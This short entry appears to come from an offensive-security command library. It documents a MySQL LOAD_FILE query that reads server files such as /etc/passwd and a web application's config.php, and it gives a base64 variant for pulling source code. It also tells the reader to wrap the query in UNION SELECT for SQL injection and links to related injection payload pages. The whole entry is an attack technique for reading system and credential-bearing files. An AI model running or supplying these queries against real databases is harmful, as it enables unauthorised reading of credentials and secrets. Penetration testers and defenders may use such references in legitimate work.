---
id: 9da5fa34-587e-4afb-a1d1-b65e7e7321f6
name: mysql-select-load-file
type: command
executor: sql
data: SELECT LOAD_FILE('/etc/passwd');
output: null
created_at: '2023-04-06T03:56:34.767755+00:00'
updated_at: '2023-04-10T20:22:51.267705+00:00'
platforms:
  - Linux
tags:
  - mysql
  - file-read
verified: true
validated: true
---

# mysql-select-load-file

## Command

```sql
SELECT LOAD_FILE('/etc/passwd');
```

## Description

This command uses the LOAD_FILE function to read and return the contents of a specified file from the MySQL server's filesystem. It requires FILE privilege and is often used in extraction procedures; in SQLi, wrap in UNION SELECT.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| '/etc/passwd' | Full path to the target file (change as needed) | Yes |

## Examples

### Basic Usage

```sql
SELECT LOAD_FILE('/etc/passwd');
```

### For Web Config

```sql
SELECT LOAD_FILE('/var/www/html/config.php');
```

### With Base64 Encoding

```sql
SELECT TO_BASE64(LOAD_FILE('/var/www/html/index.php'));
```

## Expected Output

The raw contents of the file as a single string column, e.g., "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n..." If file not found or no priv, NULL or error.

## Related

- [[procedures/mysql-file-content-extraction-via-injection]]
- [[codes/mysql-injection-payload-load-file-passwd]]
